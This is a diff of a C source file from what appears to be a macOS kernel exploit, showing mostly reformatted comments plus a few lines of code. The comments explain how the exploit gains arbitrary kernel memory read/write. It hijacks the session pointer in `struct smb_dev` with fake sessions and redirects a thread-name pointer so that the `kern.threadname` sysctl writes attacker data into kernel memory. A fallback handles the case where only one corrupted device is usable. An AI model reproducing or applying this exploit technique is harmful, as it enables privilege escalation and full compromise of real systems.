@@ -24,19 +24,15 @@
 
 
 ///
-/// This module provides arbitary kernel memory read / write
-/// by using the `smb_dev_rw.c` to obtain read / write access to
-/// `struct smb_dev` and then replacing their `dev->sd_session`
-/// pointer value to fake session created by `kmem_read_session.c`
-/// or `kmem_write_session.c`.
+/// This module provides arbitary kernel memory read / write by using the `smb_dev_rw.c` to
+/// obtain read / write access to `struct smb_dev` and then replacing their `dev->sd_session`
+/// pointer value to fake session created by `kmem_read_session.c` or `kmem_write_session.c`.
 ///
-/// In an ideal case we will have 2 active `smb_dev_rw` backends
-/// and we will configure one for read and other for write. But
-/// sometimes `smb_dev_rw_create` will only be able to obtain
-/// read / write access to only one `struct smb_dev`. Also sometimes
-/// `smb_dev_rw_write` can fail, making that `smb_dev_rw` inactive.
-/// In these cases we will only have one active backend. This module
-/// is implemented to handle this condition also
+/// In an ideal case we will have 2 active `smb_dev_rw` backends and we will configure one for
+/// read and other for write. But sometimes `smb_dev_rw_create` method will only be able to obtain
+/// read / write access to only one `struct smb_dev`. Also sometimes method `smb_dev_rw_write`
+/// can fail, making that backend inactive. In these cases we will only have one active backend.
+/// This module is implemented to handle this condition also
 ///
 
 
@@ -168,24 +164,21 @@ bootstrap_dev_t kmem_bootstrap_get_dev(struct kmem_bootstrap* kmem, dev_config_t
 }
 
 int kmem_boostrap_try_write(struct kmem_bootstrap* kmem, uintptr_t dst, const void* src, uint32_t size) {
-    /// `kmem_write_session` writes data to arbitary kernel memory by setting
-    /// the value of pointer `uth->pth_name` of current thread to `dst` and
-    /// using sysctl `kern.threadname` to write data to `dst`. This sysctl is handled
-    /// by `sysctl_handle_kern_threadname` method defined in `kern_sysctl.c`.
-    /// This method will first use `bzero` to zero out 64 (MAXTHREADNAMESIZE)
-    /// bytes of memory and then use `copyin` to copy data of upto 63 bytes from
-    /// user land to `dst`. This means that we will be writing memory in blocks of size
-    /// 64 bytes and last bytes of the written memory will always be zero
+    /// `kmem_write_session` writes data to arbitary kernel memory by setting the value of pointer
+    /// `uth->pth_name` of current thread to `dst` and using sysctl `kern.threadname` to write
+    /// data to `dst`. This sysctl is handled by `sysctl_handle_kern_threadname` method defined
+    /// in `kern_sysctl.c`. This method will first use `bzero` to zero out 64 (MAXTHREADNAMESIZE)
+    /// bytes of memory and then use `copyin` to copy data of upto 63 bytes from user land to
+    /// `dst`. This means that we will be writing memory in blocks of size 64 bytes and last bytes
+    /// of the written memory will always be zero
     ///
-    /// So to write data with arbitary length, we first have convert them
-    /// to blocks of size 64 bytes. The extra data required to fill up a block can
-    /// be read from kernel memory.
+    /// So to write data with arbitary length, we first have convert them to blocks of size 64 bytes.
+    /// The extra data required to fill up a block can be read from kernel memory.
     ///
-    /// Since the last byte in a block should always be zero, we also need to
-    /// make sure that the last byte in the last block written is actually required
-    /// to be zero. If the data is `src` ends with zero, this can be easily done.
-    /// When it is not ending with zero, we add more data to source buffer by
-    /// reading from kernel memory until we can find a byte with value zero
+    /// Since the last byte in a block should always be zero, we also need to make sure that the
+    /// last byte in the last block written is actually required to be zero. If the data is `src` ends
+    /// with zero, this can be easily done. When it is not ending with zero, we add more data to
+    /// source buffer by reading from kernel memory until we can find a byte with value zero
     ///
     
     int block_size = MAXTHREADNAMESIZE;
@@ -260,11 +253,11 @@ int kmem_boostrap_try_read(struct kmem_bootstrap* kmem, void* dst, uintptr_t src
     
     int error = kmem_read_session_read(kmem->read_session, fd, dst, src, size);
     if (error == EINVAL) {
-        /// Sometimes fake session created by `kmem_read_session` may have
-        /// invalid main iod. See `kmem_read_session_build_iod` method in
-        /// `kmem_read_session` for details. When the main iod is invalid, the
-        /// `kmem_read_session_read` will return EINVAL. When this happens
-        /// we mark the device as `USABLE` and invalidate the read session
+        /// Sometimes fake session created by `kmem_read_session` may have invalid main
+        /// iod. See `kmem_read_session_build_iod` method in `kmem_read_session` for
+        /// details. When the main iod is invalid, the `kmem_read_session_read` will return
+        /// EINVAL. When this happens we mark the device as `USABLE` and invalidate the
+        /// read session
         dev->config = DEV_USABLE;
         kmem_read_session_destroy(&kmem->read_session);
         kmem->read_session = NULL;
@@ -305,6 +298,8 @@ static const struct xe_kmem_ops kmem_ro_ops = {
 
 xe_kmem_backend_t kmem_bootstrap_create(const struct sockaddr_in* smb_addr) {
     smb_dev_rw_t devs[2] = { NULL, NULL };
+    
+    /// Obtain read / write access to `struct smb_dev` allocated on kext.48 zone
     smb_dev_rw_create(smb_addr, devs);
     
     int dev_count = (devs[0] != NULL) + (devs[1] != NULL);
